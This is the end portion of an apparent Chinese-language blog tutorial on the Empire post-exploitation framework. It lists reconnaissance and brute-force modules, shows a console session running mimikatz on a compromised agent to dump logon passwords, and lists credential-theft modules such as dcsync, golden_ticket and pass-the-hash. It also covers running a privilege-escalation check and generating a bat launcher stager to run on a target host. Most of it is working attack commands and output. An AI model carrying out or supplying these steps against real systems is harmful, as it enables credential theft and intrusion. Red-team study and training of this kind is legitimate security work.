</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_loggedon
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_object_acl
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_ou
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_rdp_session
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_session
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_site
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_subnet
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_user
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>map_domain_trust
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>process_hunter
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>set_ad_object
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>share_finder
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>user_hunter
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>reverse_dns
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>smbautobrute
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>smbscanner
</span></span><span style=display:flex><span>trollsploit<span style=color:#f92672>/</span>get_schwifty
</span></span><span style=display:flex><span>trollsploit<span style=color:#f92672>/</span>message
</span></span><span style=display:flex><span>trollsploit<span style=color:#f92672>/</span>process_killer
</span></span><span style=display:flex><span>trollsploit<span style=color:#f92672>/</span>rick_ascii
</span></span><span style=display:flex><span>trollsploit<span style=color:#f92672>/</span>rick_astley
</span></span><span style=display:flex><span>trollsploit<span style=color:#f92672>/</span>thunderstruck
</span></span><span style=display:flex><span>trollsploit<span style=color:#f92672>/</span>voicetroll
</span></span><span style=display:flex><span>trollsploit<span style=color:#f92672>/</span>wallpaper
</span></span><span style=display:flex><span>trollsploit<span style=color:#f92672>/</span>wlmdr
</span></span></code></pre></td></tr></table></div></div><h3 id=抓取密码>抓取密码</h3><p>可在agents中直接调用mimikatz：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>(Empire: VZWXYL4T) &gt; mimikatz
</span></span><span style=display:flex><span>[*] Tasked VZWXYL4T to run TASK_CMD_JOB
</span></span><span style=display:flex><span>[*] Agent VZWXYL4T tasked with task ID 1
</span></span><span style=display:flex><span>[*] Tasked agent VZWXYL4T to run module powershell/credentials/mimikatz/logonpasswords
</span></span><span style=display:flex><span>(Empire: VZWXYL4T) &gt; [*] Agent VZWXYL4T returned results.
</span></span><span style=display:flex><span>Job started: EV7DPF
</span></span><span style=display:flex><span>[*] Valid results returned by 192.168.117.179
</span></span></code></pre></td></tr></table></div></div><p>默认是：powershell/credentials/mimikatz/logonpasswords</p><p>也可以使用usemodule指定以下模块：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>credentials<span style=color:#f92672>/</span>credential_injection<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>enum_cred_store
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>invoke_kerberoast
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>cache<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>certs<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>command<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>dcsync
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>dcsync_hashdump
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>extract_tickets
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>golden_ticket
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>keys<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>logonpasswords<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>lsadump<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>mimitokens<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>pth<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>purge
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>sam<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>silver_ticket
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>trust_keys<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>powerdump<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>sessiongopher
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>tokens
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>vault_credential<span style=color:#f92672>*</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=提权>提权</h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>usemodule privesc/powerup/allchecks
</span></span><span style=display:flex><span>execute
</span></span></code></pre></td></tr></table></div></div><h2 id=0x05-生成stager>0x05 生成stager</h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>(Empire) &gt; usestager 
</span></span><span style=display:flex><span>multi/bash                osx/macho                 windows/launcher_bat
</span></span><span style=display:flex><span>multi/launcher            osx/macro                 windows/launcher_lnk
</span></span><span style=display:flex><span>multi/macro               osx/pkg                   windows/launcher_sct
</span></span><span style=display:flex><span>multi/pyinstaller         osx/safari_launcher       windows/launcher_vbs
</span></span><span style=display:flex><span>multi/war                 osx/teensy                windows/launcher_xml
</span></span><span style=display:flex><span>osx/applescript           windows/backdoorLnkMacro  windows/macro
</span></span><span style=display:flex><span>osx/application           windows/bunny             windows/macroless_msword
</span></span><span style=display:flex><span>osx/ducky                 windows/csharp_exe        windows/shellcode
</span></span><span style=display:flex><span>osx/dylib                 windows/dll               windows/teensy
</span></span><span style=display:flex><span>osx/jar                   windows/ducky             
</span></span><span style=display:flex><span>osx/launcher              windows/hta             
</span></span></code></pre></td></tr></table></div></div><p>生成一个bat的：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>usestager windows/launcher_bat
</span></span><span style=display:flex><span>set Listener hello
</span></span><span style=display:flex><span>execute
</span></span></code></pre></td></tr></table></div></div><p><img src=https://images.payloads.online/3e43a87a-4f5f-11ec-a19a-00d861bf4abb.jpg alt=f5ddc9cdb32f7eebda8571e0dbb7dbc9.png></p><p>将bat文件在目标主机上运行即可。</p><p>一般情况下，生成的都是powershell指令，只是引入方式有许多种。</p></div><nav class="hide-on-mobile section-nav"><nav id=TableOfContents><ol><li><a href=#0x00-简介>0x00 简介</a></li><li><a href=#0x01-安装>0x01 安装</a></li><li><a href=#0x02-模块介绍>0x02 模块介绍</a><ol><li><a href=#empire-module-list>Empire Module List</a></li><li><a href=#listeners>listeners</a></li><li><a href=#agents>agents</a></li><li><a href=#stager>stager</a></li><li><a href=#module>module</a></li><li><a href=#plugins>plugins</a></li><li><a href=#creds>creds</a></li></ol></li><li><a href=#0x03-simply-use-empire>0x03 Simply use Empire</a><ol><li><a href=#如何获得agents>如何获得agents</a></li></ol></li><li><a href=#0x04-使用模块>0x04 使用模块</a><ol><li><a href=#bypass-uac>Bypass UAC</a></li><li><a href=#抓取密码>抓取密码</a></li><li><a href=#提权>提权</a></li></ol></li><li><a href=#0x05-生成stager>0x05 生成stager</a></li></ol></nav></nav></div><div class=post><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script><script>var enableTruncate=!0,filterDepth=!1;const MAX_DEPTH=9;window.addEventListener("DOMContentLoaded",()=>{const e=new IntersectionObserver(e=>{e.reverse().forEach(e=>{const n=e.target.getAttribute("id");if(e.intersectionRatio>0){var t=document.querySelectorAll(`nav li a[href="#${n}"]`);t!=null&&t.forEach(e=>{if(e!=null){var t=getDepth(e.parentElement);filterDepth&&t<=MAX_DEPTH&&(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))}else filterDepth||(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))})}})});document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]").forEach(t=>{e.observe(t)})});function isVisible(e){if(!(e instanceof Element))return!1;const n=getComputedStyle(e);if(n.display==="none")return!1;if(n.visibility!=="visible")return!1;if(n.opacity<.1)return!1;if(e.offsetWidth+e.offsetHeight+e.getBoundingClientRect().height+e.getBoundingClientRect().width===0)return!1;const t={x:e.getBoundingClientRect().left+e.offsetWidth/2,y:e.getBoundingClientRect().top+e.offsetHeight/2};if(t.x<0)return!1;if(t.x>(document.documentElement.clientWidth||window.innerWidth))return!1;if(t.y<0)return!1;if(t.y>(document.documentElement.clientHeight||window.innerHeight))return!1;let s=document.elementFromPoint(t.x,t.y);do if(s===e)return!0;while(s=s.parentNode)return!1}function clearActiveStatesInTableOfContents(){document.querySelectorAll("nav li").forEach(e=>{e.classList.remove("active")})}function getDepth(e){for(var t=0;e!==null&&e.tagName.toLowerCase()!=="ul";)t++,e=e.parentElement;return t}function navItems(){var e=document.querySelectorAll("nav nav li a");return Array.from(e).filter(e=>e.href!=null&&e.hash.startsWith("#"))}function lasItemInNavBarVisible(){var e=navItems().slice(-1)[0];return isVisible(e)}document.addEventListener("DOMContentLoaded",function(){if(!enableTruncate)return;var e=navItems();console.log(e),lasItemInNavBarVisible()||(filterDepth=!0,e.forEach(function(e){var t=getDepth(e.parentElement);t>MAX_DEPTH&&e.parentElement.classList.add("depth-nested")}))})</script></body></html>